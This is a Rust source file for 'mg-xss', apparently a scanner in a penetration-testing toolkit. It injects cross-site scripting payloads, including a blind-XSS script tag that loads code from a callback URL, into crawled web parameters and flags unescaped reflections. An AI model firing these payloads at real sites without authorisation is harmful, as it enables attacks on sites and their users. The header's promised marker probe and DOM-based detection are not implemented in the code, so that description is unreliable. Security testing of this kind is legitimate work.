/*******************************************************************
 * Filename:        main.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-xss — XSS detection (reflected and DOM-based)
 *                  Injects probe strings into URL parameters and POST body
 *                  fields found in crawl corpus, checks for unescaped
 *                  reflection in response HTML.
 * Notes:           Two-phase strategy: marker probe to confirm reflection,
 *                  then payload injection in confirming parameters.
 *                  OOB blind XSS supported via --oob-url.
 *******************************************************************/

use std::collections::hash_map::DefaultHasher;
use std::fs;
use std::hash::{Hash, Hasher};
use std::path::Path;
use std::time::Duration;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::Engagement;

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "xss";
const AUDIT_TOOL: &str = "mg-xss";
const MARKER_PREFIX: &str = "xssz";

// XSS payload set — ordered from most to least likely to confirm
const XSS_PAYLOADS: &[&str] = &[
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg onload=alert(1)>",
    "{{7*7}}",
];

// Strings whose presence in unescaped form indicates reflected XSS
const REFLECTION_INDICATORS: &[&str] = &[
    "<script>alert(1)</script>",
    "<script>",
    "onerror=alert(1)",
    "onerror=alert",
    "<svg onload=alert(1)>",
    "<img src=x onerror=",
];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
#[command(
    name = "mg-xss",
    about = "XSS detection — reflected and DOM-based injection via crawl corpus"
)]
struct Args {
    /// Engagement name (must have crawl output)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent injection requests
    #[arg(long, default_value_t = 10)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,

    /// OOB callback URL for blind XSS (e.g. from mg-oob)
    #[arg(long)]
    oob_url: Option<String>,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    params: Vec<String>,
    #[serde(default = "default_method")]
    method: String,
}

// Classification of a probe result
#[derive(Debug, Serialize, PartialEq, Eq)]
enum Verdict {
    Reflected,
    Potential,
    Miss,
}

// One injection attempt result
#[derive(Debug, Serialize)]
struct XssResult {
    url: String,
    param: String,
    method: String,
    payload: String,
    verdict: Verdict,
    body_snippet: String,
}

// Top-level output written to disk
#[derive(Serialize)]
struct XssResults {
    engagement: String,
    timestamp: String,
    total_probes: usize,
    reflected: usize,
    potential: usize,
    results: Vec<XssResult>,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return default HTTP method for deserialization
fn default_method() -> String {
    "GET".to_string()
}

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize a timestamp string for use in a filename (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars()
        .map(|c| if c == ':' { '_' } else { c })
        .collect()
}

// Generate a stable 8-char hex marker from a (url, param) pair without rand
fn make_marker(url: &str, param: &str) -> String {
    let mut h = DefaultHasher::new();
    url.hash(&mut h);
    param.hash(&mut h);
    // XOR with process id for uniqueness across runs
    let pid = std::process::id() as u64;
    let v = h.finish() ^ pid;
    format!("{MARKER_PREFIX}{v:08x}")
}

// Collect injectable points from crawl host directories
fn collect_endpoints(crawl_dir: &Path) -> Vec<EndpointMatch> {
    let mut endpoints = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return endpoints;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let ep_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&ep_path) else {
            continue;
        };
        let Ok(eps): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in eps {
            if (ep.method == "GET" || ep.method == "POST") && !ep.params.is_empty() {
                endpoints.push(ep);
            }
        }
    }
    endpoints
}

// Classify response body: check for unescaped indicators or encoded marker
fn classify_reflection(body: &str, marker: &str, payload: &str) -> Verdict {
    // Check for unescaped XSS indicators in the response
    let has_indicator = REFLECTION_INDICATORS.iter().any(|ind| body.contains(ind));
    if has_indicator {
        return Verdict::Reflected;
    }
    // Check if payload appears anywhere unescaped
    if body.contains(payload) {
        return Verdict::Reflected;
    }
    // Marker reflected but encoded (e.g. &lt;) indicates potential
    if body.contains(marker) {
        return Verdict::Potential;
    }
    Verdict::Miss
}

// Probe one endpoint parameter with one payload via GET query string
async fn probe_get(
    client: reqwest::Client,
    base_url: String,
    param: String,
    payload: String,
    marker: String,
) -> XssResult {
    // Strip existing query string and re-inject the single test param
    let clean_base = base_url.split('?').next().unwrap_or(&base_url).to_string();
    let encoded = urlencoding_simple(&payload);
    let url = format!("{clean_base}?{param}={encoded}");

    let resp = client.get(&url).send().await;
    match resp {
        Ok(r) => {
            let body = r.text().await.unwrap_or_default();
            let snippet: String = body.chars().take(512).collect();
            let verdict = classify_reflection(&body, &marker, &payload);
            XssResult {
                url,
                param,
                method: "GET".into(),
                payload,
                verdict,
                body_snippet: snippet,
            }
        }
        Err(_) => XssResult {
            url,
            param,
            method: "GET".into(),
            payload,
            verdict: Verdict::Miss,
            body_snippet: String::new(),
        },
    }
}

// Probe one endpoint parameter with one payload via POST form body
async fn probe_post(
    client: reqwest::Client,
    base_url: String,
    param: String,
    payload: String,
    marker: String,
) -> XssResult {
    let clean_base = base_url.split('?').next().unwrap_or(&base_url).to_string();
    let body_str = format!("{}={}", param, urlencoding_simple(&payload));

    let resp = client
        .post(&clean_base)
        .header("Content-Type", "application/x-www-form-urlencoded")
        .body(body_str)
        .send()
        .await;

    match resp {
        Ok(r) => {
            let body = r.text().await.unwrap_or_default();
            let snippet: String = body.chars().take(512).collect();
            let verdict = classify_reflection(&body, &marker, &payload);
            XssResult {
                url: clean_base,
                param,
                method: "POST".into(),
                payload,
                verdict,
                body_snippet: snippet,
            }
        }
        Err(_) => XssResult {
            url: clean_base,
            param,
            method: "POST".into(),
            payload,
            verdict: Verdict::Miss,
            body_snippet: String::new(),
        },
    }
}

// Minimal percent-encoding for payload values in query strings
fn urlencoding_simple(s: &str) -> String {
    s.chars()
        .flat_map(|c| match c {
            ' ' => vec!['%', '2', '0'],
            '&' => vec!['%', '2', '6'],
            '#' => vec!['%', '2', '3'],
            _ => vec![c],
        })
        .collect()
}

// ── Entry point ──────────────────────────────────────────────────────────────

#[tokio::main]
async fn main() -> Result<()> {
    let args = Args::parse();

    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let endpoints = collect_endpoints(&eng.crawl_dir());
    if endpoints.is_empty() {
        anyhow::bail!(
            "no injectable endpoints found — run `mg-crawl {}` first",
            args.engagement
        );
    }

    eprintln!(
        "mg-xss: {} injectable endpoints, concurrency={}",
        endpoints.len(),
        args.concurrency
    );

    let auth_headers = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    // Build effective payload list
    let mut payloads: Vec<String> = XSS_PAYLOADS.iter().map(|s| s.to_string()).collect();
    if let Some(oob) = &args.oob_url {
        // Generate a unique token for OOB correlation
        let token = format!("{:08x}", std::process::id());
        payloads.push(format!(
            "<script src=\"{oob}/xss-{token}\"></script>"
        ));
    }

    let mut join_set: JoinSet<XssResult> = JoinSet::new();
    let mut all_results: Vec<XssResult> = Vec::new();

    for ep in &endpoints {
        for param in &ep.params {
            let marker = make_marker(&ep.path, param);

            for payload in &payloads {
                // Drain when at concurrency ceiling
                if join_set.len() >= args.concurrency
                    && let Some(Ok(r)) = join_set.join_next().await
                {
                    all_results.push(r);
                }

                let c = client.clone();
                let base = ep.path.clone();
                let p = param.clone();
                let pld = payload.clone();
                let m = marker.clone();

                if ep.method == "POST" {
                    join_set.spawn(probe_post(c, base, p, pld, m));
                } else {
                    join_set.spawn(probe_get(c, base, p, pld, m));
                }
            }
        }
    }

    // Drain remaining tasks
    while let Some(Ok(r)) = join_set.join_next().await {
        all_results.push(r);
    }

    let reflected_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Reflected)
        .count();
    let potential_count = all_results
        .iter()
        .filter(|r| r.verdict == Verdict::Potential)
        .count();

    // Print confirmed and potential hits
    for r in &all_results {
        match r.verdict {
            Verdict::Reflected => eprintln!("  [REFLECTED] {} param={} payload={}", r.url, r.param, r.payload),
            Verdict::Potential => eprintln!("  [potential] {} param={}", r.url, r.param),
            Verdict::Miss => {}
        }
    }

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let output = XssResults {
        engagement: args.engagement.clone(),
        timestamp: ts.clone(),
        total_probes: all_results.len(),
        reflected: reflected_count,
        potential: potential_count,
        results: all_results,
    };

    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create xss output dir")?;

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&output).unwrap_or_default(),
    )
    .context("write XSS results JSON")?;

    eprintln!(
        "mg-xss: {} probes, {} reflected, {} potential — {}",
        output.total_probes,
        output.reflected,
        output.potential,
        results_path.display()
    );

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "probes={} reflected={} potential={} ts={ts}",
            output.total_probes, output.reflected, output.potential
        )),
    );

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_reflected_on_unescaped_script_tag() {
        let body = "<html><body><script>alert(1)</script></body></html>";
        let verdict = classify_reflection(body, "xssz00001234", "<script>alert(1)</script>");
        assert_eq!(verdict, Verdict::Reflected);
    }

    #[test]
    fn classify_potential_when_marker_reflects_but_not_payload() {
        let body = "<html>xssz00001234 some text</html>";
        let verdict = classify_reflection(body, "xssz00001234", "<script>alert(1)</script>");
        assert_eq!(verdict, Verdict::Potential);
    }

    #[test]
    fn classify_miss_when_nothing_reflects() {
        let body = "<html>clean page</html>";
        let verdict = classify_reflection(body, "xssz00001234", "<script>alert(1)</script>");
        assert_eq!(verdict, Verdict::Miss);
    }

    #[test]
    fn make_marker_is_stable_for_same_input() {
        let m1 = make_marker("https://example.com/search", "q");
        let m2 = make_marker("https://example.com/search", "q");
        assert_eq!(m1, m2);
        assert!(m1.starts_with(MARKER_PREFIX));
    }

    #[test]
    fn make_marker_differs_for_different_params() {
        let m1 = make_marker("https://example.com/search", "q");
        let m2 = make_marker("https://example.com/search", "page");
        assert_ne!(m1, m2);
    }
}
